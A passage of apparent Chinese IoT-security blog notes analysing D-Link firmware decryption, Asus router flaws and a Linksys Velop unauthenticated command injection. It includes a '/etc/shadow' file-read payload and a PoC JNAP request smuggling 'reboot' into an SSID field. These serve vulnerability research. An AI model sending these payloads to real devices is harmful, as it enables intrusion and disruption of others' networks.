  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; hd DIR_882_FW120B06.BIN -s 0x9c -n 64</span><br><span class="line">0000009c  68 bf e5 30 a0 49 b9 e8  5d a0 bb 81 71 87 05 <span class="built_in">cd</span>  |h..0.I..]...q...|</span><br><span class="line">000000ac  70 25 18 f2 8f af d6 21  35 05 31 7e fd af 60 56  |p%.....!5.1~..`V|</span><br><span class="line">000000bc  d8 ed e7 71 6c 39 d1 68  0d a7 13 f4 04 41 87 58  |...ql9.h.....A.X|</span><br><span class="line">000000cc  e9 97 36 73 99 78 8b 01  10 ee 12 d6 b6 3b 69 ec  |..6s.x.......;i.|</span><br><span class="line">000000dc</span><br><span class="line"></span><br><span class="line">&gt; hd DIR_882_FW120B06.BIN -s 0x9c -n 64 -e <span class="string">'156/1 "%x" "\n"'</span> | cut -d$<span class="string">'\n'</span> -f2</span><br><span class="line">68bfe530a049b9e85da0bb8171875cd702518f28fafd621355317efdaf6056d8ede7716c39d168da713f44418758e997367399788b110ee12d6b63b69ec</span><br><span class="line"><span class="comment"># -s，skip</span></span><br><span class="line"><span class="comment"># -n，length</span></span><br><span class="line"><span class="comment"># -e，format</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>mips函数调用：多于四个参数，其他参数保存在栈中，看对a0操作的前面有没有sw保存到栈的操作，一般就是多出的</p>
</li>
<li><p>AES</p>
<ul>
<li>高级加密标准、对称加密算法</li>
<li>只有一个密钥，这个密钥既用来加密，也用于解密</li>
<li>加密方式有五种：<strong>ECB</strong>, <strong>CBC</strong>, CTR, CFB, OFB（从安全性角度推荐CBC加密方法</li>
<li>CBC加密需要一个十六位的key(密钥)和一个十六位iv(偏移量)、ECB加密不需要iv</li>
<li>Google：python 利用Crypto进行AES解密&amp;加密文件</li>
</ul>
</li>
<li><p>AES_cbc_encrypt</p>
<ul>
<li>(const unsigned char <em>in, unsigned char </em>out, size_t length, const AES_KEY <em>key, unsigned char </em>ivec, const int enc);</li>
<li>If enc is non-zero, AES_cbc_encrypt() encrypts len bytes at in to out using the 128 bit key and the 128 bit initialization vector ivec in CBC mode. </li>
<li>If enc is 0, AES_cbc_encrypt() performs the corresponding decryption.</li>
</ul>
</li>
<li><p>一般情况下：解密、获取解密文件hash、hash对比来判断正确与否</p>
</li>
<li><p>两个差不多大的数值，一个是真正长度，另一个是为对齐而增加后的长度</p>
<ul>
<li>（AES为了安全考虑，每个块是16字节</li>
<li>文中关于datalen_1和2的分析还是有些乱</li>
</ul>
</li>
<li><p>hexdump中出现*号，表示一堆0</p>
</li>
<li><p>RSA_verify</p>
<ul>
<li>(int type, const unsigned char <em>m, unsigned int m_len, unsigned char </em>sigbuf, unsigned int siglen, RSA *rsa);</li>
<li>verifies that the signature <strong>sigbuf</strong> of size <strong>siglen</strong> matches a given message digest <strong>m</strong> of size <strong>m_len</strong>. </li>
<li><strong>type</strong> denotes the message digest algorithm that was used to generate the signature. </li>
<li><strong>rsa</strong> is the signer’s public key.</li>
<li>returns 1 on successful verification, 0 otherwise.</li>
</ul>
</li>
<li><p>RSA_verify，type=0x2A2=674，openssl/obj_mac.h中，#define NID_SHA512 674，说明是sha512，是一种hash算法</p>
</li>
<li><p>AES+RSA常结合使用：前者对称，后者非对称</p>
</li>
<li><p>unlink</p>
<ul>
<li>(const char* pathname);</li>
<li>删除一个名字（某些情况下删除这个名字所指向的文件）</li>
<li>从文件系统中中删除一个名字，若这个名字是指向这个文件的最后一个链接，并且没有进程处于打开这个文件的状态，则删除这个文件，释放这个文件占用的空间</li>
<li>如果这个名字是指向这个文件的最后一个链接，但有某个进程处于打开这个文件的状态，则暂时不删除这个文件，要等到打开这个文件的进程关闭这个文件的文件描述符后才删除这个文件</li>
</ul>
</li>
</ul>
<h2 id="02-流程梳理"><a href="#02-流程梳理" class="headerlink" title="02-流程梳理"></a>02-流程梳理</h2><h3 id="1-main"><a href="#1-main" class="headerlink" title="1-main"></a>1-main</h3><ol>
<li>是否有“decrypt”字符串？</li>
<li>加密or解密</li>
</ol>
<h3 id="2-decrypt-firmware"><a href="#2-decrypt-firmware" class="headerlink" title="2-decrypt_firmware"></a>2-decrypt_firmware</h3><ol>
<li>参数个数<ol>
<li>小于2（1），打印帮助信息</li>
<li>大于2（3），pem为指定的文件</li>
<li>等于2，pem为默认的”/tmp/public.pem”</li>
</ol>
</li>
<li>check_cert获取密钥，用于后面数字签名的验证，pem文件中存储着rsa的密钥（公/私）<ol>
<li>OPENSSL_add_all_algorithms_noconf、RSA_new、PEM_read_RSAPublicKey、RSA_free</li>
<li>fopen/fclose打开/关闭pem文件</li>
<li>（目前遇到rsa两种情况：RSA解密aes的密钥、RSA解密用于验证数字签名</li>
</ol>
</li>
<li>call_aes_cbc_encrypt调用aes_cbc_encrypt：aes-cbc解密得到key，后面真正解密固件时用到<ol>
<li>AES_set_decrypt_key (userKey, bits, key)：通过userkey进一步获取key，可以理解为用户提供的密钥userkey不能直接用于解密，需要做进一步处理</li>
<li>AES_cbc_encrypt(in, out, length, key, ivec, enc)：加/解密通过enc指定、cbc是aes的一种模式，cbc需要ivec而ebc不需要</li>
<li>in、key、ivec都是硬编码在二进制程序中的，in输入为加密的aes密钥，解密后用于后面aes解密固件</li>
</ol>
</li>
<li>打印上面解密出来的key：<ol>
<li>有两次aes解密，第一次解密aes密钥（用于第二次），第二次解密固件</li>
<li>第一次解密的密钥来自硬编码，第二次解密的密钥来自第一次的解密结果</li>
</ol>
</li>
<li>actual_decryption：真正的解密固件的函数，前面都是准备工作<ol>
<li>选择pem文件：自己指定还是用默认的</li>
<li>从pem中获取rsa密钥：用于后面验证数字签名</li>
<li>aes解密：获取后面aes解密的密钥</li>
</ol>
</li>
</ol>
<h3 id="3-actual-decryption"><a href="#3-actual-decryption" class="headerlink" title="3-actual_decryption"></a>3-actual_decryption</h3><ol start="0">
<li>传参：待解密的固件、 临时文件”/tmp/.firmware.orig”、前面解密获得的key</li>
<li>映射到内存等准备工作<ol>
<li>memset准备两块内存空间（0填充</li>
<li>stat获取加密固件的文件状态，成功则open打开，再成功则mmap映射到内存</li>
<li>打开tmp下的临时文件，成功则lseek将文件指针移动到最后，并添加1个0，随后close关闭文件，来保存修改、</li>
<li>open再次打开tmp下临时文件，并mmap映射到内存</li>
</ol>
</li>
<li>检查标记：将加密固件传入check_magic来检查标记，其memcmp查看是否以“SHRS”开头</li>
<li>小端转大端：从文件偏移4、8处取出数据，htonl将主机字节序转为网络字节序，得到两个值：v1和v2<ol>
<li>htonl：host、network、unsigned long </li>
<li>主机序一般为小端，网络为大端，htonl也就是将小端转为大端</li>
<li>小端符合人思维（倒序），大端直观（正序），也就是将内存中倒着的数据正过来，好计算</li>
</ol>
</li>
<li>calc_SHA512_digest第一次验证完整性<ol>
<li>传入：加密固件、值v2，</li>
<li>其SHA512_Init、SHA512_Update、SHA512_Final，一看就是计算hash，</li>
<li>memcmp比较文件偏移0x9c处和hash值</li>
</ol>
</li>
<li>aes_cbc_encrypt解密固件：<ol>
<li>in输入：加密的固件，从偏移6dc处开始而非文件开头</li>
<li>out输出：tmp下的临时文件，可见这个文件的作用就是接收解密后的固件，为其提供空间（类似字符数组存放返回结果，在此只不过换成了文件</li>
<li>len长度：前面htonl获取的值v2</li>
<li>key密钥：第一次aes解密后的结果</li>
<li>ivec初始化向量：硬编码在加密固件中（第一次的iv硬编码在二进制程序中</li>
</ol>
</li>
<li>calc_SHA512_digest第二次验证完整性<ol>
<li>传入：解密后的固件、值v1</li>
<li>memcmp比较文件偏移0x5c处和hash值</li>
</ol>
</li>
<li>calc_SHA512_digest第三次验证完整性<ol>
<li>传入：解密后的固件、值v1、第一次aes解密获取到的aes_key</li>
<li>同上2次没本质区别，只不过hash的对象为固件+key，SHA512_Update多调用一次即可</li>
<li>memcmp比较文件偏移0x1c处和hash值</li>
</ol>
</li>
<li>SHA512_checker调用RSA_verify验证数字签名：<ol>
<li>RSA_verify(type, m, m_len, sigbuf, siglen,rsa)</li>
<li>type摘要算法类型：指定生成签名的hash算法，0x2a2表示SHA512</li>
<li>rsa密钥：前面从pem文件中获取到的</li>
<li>m消息，sigbuf签名：用rsa解密sigbuf，type计算m的散列值，对比二者来验证签名</li>
<li>前后调用两次：第一次（m=0x5c，sigbuf=0x2dc），第二次（m=0x9c，sigbuf=0x4dc）</li>
</ol>
</li>
<li>扫尾：munmap、close、解密成功返回0</li>
</ol>
<h3 id="4-扫尾"><a href="#4-扫尾" class="headerlink" title="4-扫尾"></a>4-扫尾</h3><ol>
<li>unlink删除加密的固件</li>
<li>rename将tmp下的临时文件重命名为加密固件的名字，此时临时文件就是解密后的固件</li>
<li>RSA_free释放rsa结构体，结束</li>
</ol>
<h2 id="03-代码编写"><a href="#03-代码编写" class="headerlink" title="03-代码编写"></a>03-代码编写</h2><ul>
<li>通过汇编写C</li>
<li><p>通过C写python</p>
</li>
<li><p><a href="https://github.com/0xricksanchez/dlink-decrypt（暂不自己动手了，有类似需求时当做参考" target="_blank" rel="noopener">https://github.com/0xricksanchez/dlink-decrypt（暂不自己动手了，有类似需求时当做参考</a></p>
</li>
</ul>
<h2 id="04-固件结构"><a href="#04-固件结构" class="headerlink" title="04-固件结构"></a>04-固件结构</h2><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-09-18-085343.jpg" alt="image-20200918161124445"></p>
<h3 id="0-3"><a href="#0-3" class="headerlink" title="0-3"></a>0-3</h3><ul>
<li>4字节：53 48 52 53</li>
<li>SHRS，加密固件的标记</li>
</ul>
<h3 id="4-7、8-B"><a href="#4-7、8-B" class="headerlink" title="4-7、8-B"></a>4-7、8-B</h3><ul>
<li>各4字节：00 D1 D9 A6/00 D1 D9 B0</li>
<li>处理<ul>
<li>汇编中通过lwr/lwl逆序取出：0xA6D9D100</li>
<li>通过htonl：将主机字节序转为网络字节序，也就是再倒一次变成0x00D1D9A6，十进制为13752742</li>
<li>（不知为何这样，可能汇编中只能倒着取出，所以逼不得已再倒一次变正常</li>
<li>得到两个数：13752742/13752752（可见二者仅差了10</li>
<li>加密固件大小：0xD1F247=13759047（并非二者，但都是1375</li>
</ul>
</li>
<li>分析value2<ul>
<li>value2=13752752，传入了calc_SHA512_digest第一次验证完整性和aes_cbc_encrypt第二次解密，一同传入的还有加密固件的0x6DC偏移，0xD1F247-0x6DC=13757291，也不对</li>
<li>value1=13752742，传入了calc_SHA512_digest第二次和第三次验证完整性，注意此时一同传入的是解密后的固件了，获取解密后固件（已经有解密脚本了）的大小为D1D9B0=13752752，正是value2的值（注意而不是value1</li>
<li>因此：value2为解密后固件大小</li>
</ul>
</li>
<li>分析value1<ul>
<li>由上分析1是与解密后的固件相关的，1仅比2小了10，即解密固件大小比1多了10，多的10是什么？</li>
<li>查看解密后固件最后10字节，发现全是0，大胆猜想：莫非是填充？</li>
<li>value1=13752742 % 16 = 6，value2=13752745 % 16 = 0，1取余为6，填充16-6=10正好凑16整数</li>
<li>填充到16整数也是由aes决定的，参考<a href="https://tools.ietf.org/html/rfc3602#section-2.4（Block" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc3602#section-2.4（Block</a> Size and Padding</li>
<li>因此：value1为原始固件大小</li>
</ul>
</li>
<li>综上：1原始解密后固件大小，2在1基础上填充后的</li>
</ul>
<h3 id="C-1B"><a href="#C-1B" class="headerlink" title="C-1B"></a>C-1B</h3><ul>
<li>16字节：67 C6 69 73 51 FF 4A EC 29 CD BA AB F2 FB E3 46</li>
<li>第二次aes解密（解密固件）的ivec向量</li>
</ul>
<h3 id="1C-5B"><a href="#1C-5B" class="headerlink" title="1C-5B"></a>1C-5B</h3><ul>
<li>64字节：FD A7 4D 06 A4 66 E6 AD BF C4 9D 13 F3 F7 D1 12 98 6B 2A 35 1D 0E 90 85 B7 83 F7 4D 3A 2A 25 5A B8 13 0C FB 2A 17 7A B2 99 04 60 66 EB C2 58 98 82 74 08 E3 54 1E E2 51 44 42 E8 D6 8E 46 6E 2C</li>
<li>第三次calc_SHA512_digest验证完整性时（传入解密后固件+解密后的aes_key），64字节的消息摘要</li>
</ul>
<h3 id="5C-9B"><a href="#5C-9B" class="headerlink" title="5C-9B"></a>5C-9B</h3><ul>
<li>64字节：16 57 D3 0B 07 D7 7C 9E 11 EC 72 1D FB 87 A2 5B 18 EC 53 82 85 B9 84 39 B6 B4 DD 85 DE F0 28 3D 36 0E BE AA D0 9D 71 B0 BA 3E 26 40 E8 C5 4C 0E 0B 32 EB 00 E8 F7 21 D7 3A AA 0D 14 D5 F7 E8 72</li>
<li>第二次calc_SHA512_digest验证完整性时（仅传入解密后固件），64字节的消息摘要</li>
</ul>
<h3 id="9C-DB"><a href="#9C-DB" class="headerlink" title="9C-DB"></a>9C-DB</h3><ul>
<li>65字节：68 BF E5 30 A0 49 B9 E8 5D A0 BB 81 71 87 05 CD 70 25 18 F2 8F AF D6 21 35 05 31 7E FD AF 60 56 D8 ED E7 71 6C 39 D1 68 0D A7 13 F4 04 41 87 58 E9 97 36 73 99 78 8B 01 10 EE 12 D6 B6 3B 69 EC</li>
<li>第一次calc_SHA512_digest验证完整性时（仅传入加密固件），64字节的消息摘要</li>
</ul>
<h3 id="DC-2DB"><a href="#DC-2DB" class="headerlink" title="DC-2DB"></a>DC-2DB</h3><ul>
<li>512个0字节</li>
<li>填充用的？还是用来保存后续产生的数据？</li>
</ul>
<h3 id="2DC-4DB、4DC-6DB"><a href="#2DC-4DB、4DC-6DB" class="headerlink" title="2DC-4DB、4DC-6DB"></a>2DC-4DB、4DC-6DB</h3><ul>
<li>各512个字节</li>
<li>两次RSA_verify验证所用的签名</li>
</ul>
<h3 id="6DC"><a href="#6DC" class="headerlink" title="6DC-"></a>6DC-</h3><ul>
<li>第二次aes解密（解密固件），传入加密固件的6dc偏移</li>
<li>真正的加密数据</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>0-6DB：头部，总大小1756，提供附加数据<ul>
<li>0-DB：meta checks元数据，用于解密或验证</li>
<li>DC-2DB：512空字节，填充？保留空间？</li>
<li>2DC-4DB、4DC-6DB：各512字节，两次RSA_verify验证所用的签名</li>
<li>6DC-：真正的加密数据</li>
</ul>
</li>
</ul>
<p>首发于iotsec-zone：<a href="https://www.iotsec-zone.com/article?id=17" target="_blank" rel="noopener">https://www.iotsec-zone.com/article?id=17</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>固件解密</tag>
      </tags>
  </entry>
  <entry>
    <title>天府杯-asus路由器漏洞分析</title>
    <url>/2021/11/10/iot/%E5%A4%A9%E5%BA%9C%E6%9D%AF-asus%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="天府杯-asus路由器漏洞分析"><a href="#天府杯-asus路由器漏洞分析" class="headerlink" title="天府杯-asus路由器漏洞分析"></a>天府杯-asus路由器漏洞分析</h2><ul>
<li>概要：envrams暴露、current_lang信息泄漏、整数溢出及堆溢出</li>
<li>查看端口以便选择目标程序<ul>
<li>筛出：envrams、wanduck、cfg_server、httpd、infosvr</li>
<li>排除：三方开源程序、仅监听本地端口的程序</li>
<li>三方：维护者众多，发现漏洞较难</li>
<li>监听本地端口：即便有漏洞也无法直接利用（若有进程通信则可能间接利用）</li>
</ul>
</li>
<li>其它<ul>
<li>固件获取：web页面中设置后，可telnet登陆设备，将二进制程序取回本地</li>
<li>固件遵守GPL协议，故可找相关代码作为参考，如梅林固件</li>
<li>httpd程序中找到路由表：结构体数组，并非网络概念，而是uri路由</li>
<li>当多个华硕路由器通过AiMesh组网之后，会出现cfg_client和cfg_server之间的通信</li>
<li>路由表广义上来讲就是结构体数组，不管是uri还是端口的</li>
</ul>
</li>
<li>nvram_xxx函数<ul>
<li>与配置相关，set保存/更新配置、get获取配置</li>
<li>最终会执行到和内核通信的socket：提高了配置访问速度、解决配置更新不同步的问题</li>
</ul>
</li>
<li>envrams暴露问题<ul>
<li>envrams：获取和更新配置的接口、监听tcp5152端口、支持show/get/set等指令、可获取/更新nvram.nvm文件中配置</li>
<li>nvram.nvm文件：保存其它进程的配置，重启后，配置会加载到内核中，但是加载时机较晚，故会覆盖已有配置</li>
<li>比如envrams将x_Setting的值设置为0，设备误认为自己被恢复出厂设置，故web不需要用户名/密码即可登陆</li>
<li>修复简单粗暴：iptables增加一条规则，限制了5152端口的访问</li>
</ul>
</li>
<li>结构体的六个成员<ul>
<li>1：访问的uri</li>
<li>2：页面类型</li>
<li>3：cache-control头</li>
<li>4：某函数</li>
<li>5：uri的处理函数，比如do_ej是页面解析器</li>
<li>6：是否需要登陆</li>
</ul>
</li>
<li>信息泄露问题<ul>
<li>do_ej也能处理post请求，而且接收current_lang参数，用于控制页面的显示语言</li>
<li>snprintf限制长度为0x10，若输入长度超过0x10，原本的“%s.dict”就会被顶出去（//here，format参数怎么被顶？）</li>
<li>current_lang=/////etc/shadow，shadow内容将会通过http直接回显出来（//here，current_lang字段看来是内嵌在html页面上的，那么文件内容怎么解析出来的？）</li>
<li>修复：限制a1参数的长度和内容</li>
</ul>
</li>
<li>cfg_server程序<ul>
<li>类似httpd，可以在cfg_server程序中找到多个路由表，关于端口的</li>
<li>TLV（Type-Length-Value）格式：T即路由表中的编号、V是aes加密数据内容及其crc32值、L为不合理的值会怎样（即漏洞点）</li>
</ul>
</li>
<li>整数溢出、堆溢出//here<ul>
<li>构造恶意数据：第0x28号请求、长度为0xFFFFFFF4、crc32值为0（绕过crc32校验)</li>
<li>在AES解密过程中，会触发整数溢出，导致malloc错误的内存大小</li>
<li>R11值为0xFFFFFFF4，而malloc长度仅仅为0x4，声明的内存长度小于实际长度，造成堆溢出，导致AES解密数据写入后续溢出的堆内存中</li>
<li>利用：待学习</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://mp.weixin.qq.com/s/5dJ74cAATmPg7sjYHZR4wQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5dJ74cAATmPg7sjYHZR4wQ</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Linksys velop无需认证的命令注入漏洞</title>
    <url>/2021/10/21/iot/Linksys%20velop%E6%97%A0%E9%9C%80%E8%AE%A4%E8%AF%81%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="Linksys-velop无需认证的命令注入漏洞"><a href="#Linksys-velop无需认证的命令注入漏洞" class="headerlink" title="Linksys velop无需认证的命令注入漏洞"></a>Linksys velop无需认证的命令注入漏洞</h2><ol>
<li>下载文章中的固件版本 1.1.2.185309：<a href="https://noexit.tv/linksys-velop-firmware-versions-with-download/" target="_blank" rel="noopener">https://noexit.tv/linksys-velop-firmware-versions-with-download/</a></li>
<li>通过JNAP的action，有个命令注入，可RCE，无需认证</li>
<li>JNAP是思科的web服务协议，类似于HNAP</li>
<li>通过X-JNAP-Action请求头来执行JNAP的action</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求/JNAP</span></span><br><span class="line">POST /JNAP/ HTTP/1.1</span><br><span class="line"><span class="comment"># 指定action</span></span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure</span><br><span class="line"><span class="comment"># 指定action的参数    </span></span><br><span class="line">&#123;<span class="string">"configApSsid"</span>:<span class="string">"ssid"</span>,<span class="string">"configApPassphrase"</span>:<span class="string">"wifipass"</span>,<span class="string">"srpLogin"</span>:<span class="string">"user"</span>,<span class="string">"srpPassword"</span>:<span class="string">"password"</span>&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>官网不提供以往固件，自行Google老固件<a href="https://noexit.tv/linksys-velop-firmware-versions-with-download/" target="_blank" rel="noopener">https://noexit.tv/linksys-velop-firmware-versions-with-download/</a></li>
</ol>
<h3 id="提取文件系统"><a href="#提取文件系统" class="headerlink" title="提取文件系统"></a>提取文件系统</h3><blockquote>
<p>提取WHW03固件的文件系统</p>
</blockquote>
<ol>
<li>固件：<a href="https://www.linksys.com/us/support-article/?articleNum=207568（没有历史固件，只有最新Ver" target="_blank" rel="noopener">https://www.linksys.com/us/support-article/?articleNum=207568（没有历史固件，只有最新Ver</a>. 2.1.13.200506和较新Ver. 1.1.13.200506，先凑活用较新</li>
<li>直接binwalk -e，总是提示“No space left on device”</li>
<li>binwalk查看信息，发现Linux ext文件系统，偏移0x800000（不同的binwalk版本结果不同，较新版本在前面还会有dtb信息，算是一个标志，但旧版本也不影响，知道即可</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 较新版本在此有dtb标志</span></span><br><span class="line">14119         0x3727          xz compressed data</span><br><span class="line">14340         0x3804          xz compressed data</span><br><span class="line"><span class="comment"># 较新版本在此有dtb标志</span></span><br><span class="line">8388608       0x800000        Linux EXT filesystem, rev 0.0, ext4 filesystem data, UUID=4fae4919-9df2-4368-9241-cb6b47494749</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>winhex中将0x800000到最后，复制到一个新文件：右键、选块起始位置、选块尾部、编辑、复制到新文件（dd也可，能图形就图形的，简单</li>
<li>直接7zip打开压缩包即可看到文件系统（实测其他压缩软件不可</li>
</ol>
<h3 id="下载历史固件"><a href="#下载历史固件" class="headerlink" title="下载历史固件"></a>下载历史固件</h3><ul>
<li>googol到的：<a href="https://noexit.tv/linksys-velop-firmware-versions-with-download/" target="_blank" rel="noopener">https://noexit.tv/linksys-velop-firmware-versions-with-download/</a></li>
<li>同上所讲，binwalk也是偏移0x800000</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk FW_WHW03_1.1.2.185309_prod.img </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">14119         0x3727          xz compressed data</span><br><span class="line">14340         0x3804          xz compressed data</span><br><span class="line">8388608       0x800000        Linux EXT filesystem, rev 0.0, ext4 filesystem data, UUID=927b8106-610e-4cc1-943f-ee1062d562d5</span><br></pre></td></tr></table></figure>
<h3 id="找漏洞点"><a href="#找漏洞点" class="headerlink" title="找漏洞点"></a>找漏洞点</h3><ol>
<li>根据action找到对应lua文件：JNAP\modules\smartconnect_server.lua</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 触发漏洞的action</span></span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure</span><br><span class="line"><span class="comment"># 2 \filestem-dir\JNAP目录下搜索action字符串“SmartConnectConfigure”</span></span><br><span class="line"><span class="comment"># 3 共找到3个文件，且匹配到的内容都是一样的，观察3个文件所在目录，选择通用的JNAP\modules\smartconnect_server.lua</span></span><br><span class="line">\filesystem-dir\JNAP\modules\lan\smartconnect_server.lua （匹配4次）</span><br><span class="line">\filesystem-dir\JNAP\modules\smartconnect_server.lua （匹配4次）</span><br><span class="line">\filesystem-dir\JNAP\modules\wan\smartconnect_server.lua （匹配4次）</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>找到对应的函数：SmartConnectConfigure</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JNAP\modules\smartconnect_server.lua</span></span><br><span class="line"><span class="built_in">return</span> require(<span class="string">'libhdklua'</span>).loadmodule(<span class="string">'jnap_smartconnect'</span>), &#123;</span><br><span class="line">    [<span class="string">'http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure'</span>] = SmartConnectConfigure,</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>继续调用函数：smartconnect库中的smartConnectConfigure</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JNAP\modules\smartconnect_server.lua</span></span><br><span class="line"><span class="built_in">local</span> <span class="keyword">function</span> SmartConnectConfigure(ctx, input)</span><br><span class="line">    <span class="built_in">local</span> smc = require(<span class="string">'smartconnect'</span>)<span class="comment"># 导入库文件</span></span><br><span class="line">    <span class="built_in">local</span> sc = ctx:sysctx()</span><br><span class="line">    <span class="built_in">local</span> error, output = smc.smartConnectConfigure(sc, input)<span class="comment"># 调用库中的函数，input参数传入</span></span><br><span class="line">    <span class="built_in">return</span> error or <span class="string">'OK'</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录中搜索smartconnect，找到usr\local\lib\lua\5.1\smartconnect.lua，并得到库文件所在目录</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>继续调用函数：bluetooth中的btSmartConnectConfigure（怎么保证mode是2呢？</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># usr\local\lib\lua\5.1\smartconnect.lua</span></span><br><span class="line"><span class="keyword">function</span> _M.smartConnectConfigure(sc, input)</span><br><span class="line">    <span class="built_in">local</span> smart_mode = sc:get_smartmode()</span><br><span class="line">    <span class="keyword">if</span> smart_mode == 2 <span class="keyword">then</span></span><br><span class="line">        <span class="comment">## If a device is Master node.</span></span><br><span class="line">        <span class="built_in">local</span> error, output = bluetooth.btSmartConnectConfigure(input.configApSsid, input.configApPassphrase, input.srpLogin, input.srpPassword)<span class="comment">## 继续调用，并传入input</span></span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>继续调用函数：本文件中的_M.btRunCentralCommandSync</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \usr\local\lib\lua\5.1\bluetooth.lua</span></span><br><span class="line"><span class="keyword">function</span> _M.btSmartConnectConfigure(configap, configpass, srplogin, srppass)</span><br><span class="line">    <span class="built_in">local</span> opt = <span class="string">'-f '</span>..<span class="string">'-A '</span>..configap..<span class="string">'-P '</span>..configpass..<span class="string">'-L '</span>..srplogin..<span class="string">'-R '</span>..srppass</span><br><span class="line">    <span class="built_in">local</span> error, output = _M.btRunCentralCommandSync(opt)<span class="comment"># 继续调用，传入input构建的opt</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>最终调用popen函数（常见的命令注入函数</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \usr\local\lib\lua\5.1\bluetooth.lua</span></span><br><span class="line">_M.RUN_CENTRAL_CMD_SYNC = <span class="string">'/usr/bin/btsetup_central %s'</span><span class="comment"># 宏定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> _M.btRunCentralCommandSync(option)</span><br><span class="line">    assert(option)</span><br><span class="line">    <span class="built_in">local</span> file = io.popen(_M.RUN_CENTRAL_CMD_SYNC:format(option))<span class="comment"># 字符串拼接：宏 + 用户可控的opt</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h3 id="poc-漏洞触发"><a href="#poc-漏洞触发" class="headerlink" title="poc+漏洞触发"></a>poc+漏洞触发</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 poc</span></span><br><span class="line">POST /JNAP/ HTTP/1.1<span class="comment"># 请求/JNAP</span></span><br><span class="line">Host: 10.158.1.1</span><br><span class="line">Accept: application/json; charset=UTF-8</span><br><span class="line">Expires: Fri, 10 Oct 2015 14:19:41 GMT</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Content-Length: 135</span><br><span class="line">User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)</span><br><span class="line">Connection: close</span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure<span class="comment"># 指定action</span></span><br><span class="line">    </span><br><span class="line">&#123;<span class="string">"configApSsid"</span>:<span class="string">"testssid;reboot;"</span>,<span class="string">"configApPassphrase"</span>:<span class="string">"testwifipass"</span>,<span class="string">"srpLogin"</span>:<span class="string">"testlogin"</span>,<span class="string">"srpPassword"</span>:<span class="string">"testpass"</span>&#125;<span class="comment"># 指定action的参数  </span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 2 input</span></span><br><span class="line">&#123;<span class="string">"configApSsid"</span>:<span class="string">"testssid;reboot;"</span>,<span class="string">"configApPassphrase"</span>:<span class="string">"testwifipass"</span>,<span class="string">"srpLogin"</span>:<span class="string">"testlogin"</span>,<span class="string">"srpPassword"</span>:<span class="string">"testpass"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 拼接opt字符串</span></span><br><span class="line"><span class="built_in">local</span> opt = <span class="string">'-f '</span>..<span class="string">'-A '</span>..configap..<span class="string">'-P '</span>..configpass..<span class="string">'-L '</span>..srplogin..<span class="string">'-R '</span>..srppass</span><br><span class="line"><span class="built_in">local</span> opt = <span class="string">'-f '</span>..<span class="string">'-A '</span>..<span class="string">"testssid;reboot;"</span>..<span class="string">'-P '</span>..<span class="string">"testwifipass"</span>..<span class="string">'-L '</span>..<span class="string">"testlogin"</span>..<span class="string">'-R '</span>..<span class="string">"testpass"</span></span><br><span class="line"><span class="built_in">local</span> opt = <span class="string">'-f -A testssid;reboot;-P testwifipass-L testlogin-R testpass"</span></span><br><span class="line"><span class="string"></span></span><br><span 